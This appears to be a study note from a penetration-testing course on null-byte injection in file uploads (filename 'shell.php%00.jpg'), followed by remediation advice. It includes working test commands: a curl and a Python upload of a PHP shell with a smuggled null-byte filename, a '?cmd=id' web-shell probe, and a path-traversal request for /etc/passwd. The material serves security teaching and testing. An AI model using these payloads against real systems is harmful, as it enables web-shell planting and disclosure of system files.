---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.06 Null Byte Injection (file.php%00.jpg)"
---

# 22.06 — Null Byte Injection (file.php%00.jpg)

## What Is Null Byte Injection?

```
NULL BYTE: \x00 (ASCII 0, encoded as %00 in URLs)
  
  C STRINGS ARE NULL-TERMINATED:
  "hello\x00world" is treated as "hello" in C!
  The null byte terminates the string.
  
  ATTACK:
  Filename: shell.php%00.jpg
  
  URL-decoded: shell.php\x00.jpg
  
  APP CHECKS: What is the extension? → .jpg → ALLOWED!
  PHP file_get_contents/fopen etc. with C backend:
  Treats: shell.php\x00.jpg as shell.php (stops at null)
  SAVES AS: shell.php → executable PHP!
  
  RESULT:
  Extension check sees: .jpg (passes!)
  OS/PHP sees: shell.php (executable!)
```

---

## When This Works

```
REQUIRES:
  1. Language/framework uses C string handling for filenames
  2. Or: OS-level file operation truncates at null byte
  
  WORKED IN:
  - PHP 5.3 and earlier (vulnerable to null byte in file functions)
  - Various Ruby/Rails older versions
  - Some frameworks that call C libraries
  
  PATCH STATUS:
  PHP 5.3.4+ fixed this for most file functions
  Most modern frameworks are not vulnerable
  
  BUT:
  Some legacy apps still run on vulnerable PHP versions
  Some C extensions might still be vulnerable
  Worth testing on older/legacy systems!
  
  ALSO WORKS IN:
  URL-based file access (if PHP url_fopen or curl affected)
  Custom C extensions processing filenames
  Applications using C/C++ file handling via FFI
```

---

## Testing Null Byte Injection

```bash
# METHOD 1: IN BURP — MODIFY FILENAME IN MULTIPART BODY
# Original: filename="shell.jpg"
# Modified: filename="shell.php%00.jpg"
# (Note: Burp handles URL encoding in the raw request)

# Also try with actual null byte:
# In Burp: right-click body → "Paste from file" or use hex editor
# Or: search and replace "shell.jpg" with "shell.php" + hex 00 + ".jpg"

# METHOD 2: CURL WITH NULL BYTE:
# URL-encode the filename:
curl -X POST https://target.com/upload \
  -b "session=SESSION" \
  --form 'file=@shell.php;filename=shell.php%00.jpg;type=image/jpeg'

# METHOD 3: PYTHON:
import requests

with open('shell.php', 'rb') as f:
    content = f.read()

files = {'file': ('shell.php\x00.jpg', content, 'image/jpeg')}
response = requests.post('https://target.com/upload', 
    files=files,
    cookies={'session': 'SESSION'})
print(response.text)

# STEP 4: CHECK IF FILE SAVED AS .php:
# After upload, try accessing:
curl "https://target.com/uploads/shell.php?cmd=id"
# OR: check response for the saved filename
```

---

## Other Null Byte Contexts

```
NULL BYTE IN PATH TRAVERSAL:
  GET /files/../../../etc/passwd%00.jpg HTTP/1.1
  
  Application strips: .jpg extension → path = /files/../../../etc/passwd
  C library sees: /files/../../../etc/passwd (stops at null)
  → File read of /etc/passwd!
  
NULL BYTE IN SQL INJECTION:
  Less common but: some databases have issues with null bytes in strings
  
NULL BYTE IN OTHER CHECKS:
  Image dimensions check: filename.php%00.gif
  → GIF magic bytes check passes → saves as .php (truncated at null)
  
  Combined with Content-Type bypass:
  Filename: shell.php%00.jpg + Content-Type: image/jpeg
  → Both checks bypassed!
```

---

## Fix

```
PREVENTING NULL BYTE INJECTION:

1. SANITIZE FILENAMES — REMOVE NULL BYTES:
   # Python:
   filename = filename.replace('\x00', '')
   
   # PHP:
   $filename = str_replace(chr(0), '', $filename);
   
   # Or: reject files with null bytes:
   if '\x00' in filename:
       raise ValueError("Invalid filename")

2. USE LANGUAGE-NATIVE STRING HANDLING:
   In PHP 5.3.4+: file functions no longer truncate at null
   Ensure PHP version is up to date!
   
   # PHP check:
   if (strpos($filename, chr(0)) !== false) {
       die("Null byte detected in filename!");
   }

3. GENERATE NEW FILENAME INSTEAD:
   BEST PRACTICE: Never use user-provided filename!
   Generate: UUID + extension (extension from allowlist, not from input)
   
   import uuid
   safe_filename = str(uuid.uuid4()) + '.jpg'
   # → User filename is completely ignored!
   # → Null bytes in original filename don't matter!

4. VALIDATE EXTENSION AFTER CLEANUP:
   # After sanitizing filename:
   clean_name = sanitize(filename)
   ext = Path(clean_name).suffix.lower()
   if ext not in ALLOWED_EXTENSIONS:
       reject()
```

---

## Related Notes
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] — alternative extensions
- [[05 - Double Extension (file.php.jpg)]] — double extension trick
- [[07 - File Upload + Path Traversal]] — null byte in path traversal context
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
